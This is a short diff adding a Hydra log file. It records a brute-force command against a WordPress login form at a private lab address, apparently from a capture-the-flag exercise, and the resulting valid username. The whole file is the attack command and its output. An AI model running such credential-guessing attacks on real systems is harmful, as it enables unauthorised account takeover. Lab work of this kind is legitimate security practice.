@@ -1,0 +1,2 @@
+# Hydra v8.6 run at 2021-06-17 15:26:49 on 10.10.246.167 http-post-form (hydra -L fsocity.dic -p test -V -f -o user.hydra 10.10.246.167 http-post-form /wp-login.php:log=^USER^&pwd=^PASS^:Invalid username)
+[80][http-post-form] host: 10.10.246.167   login: Elliot   password: test
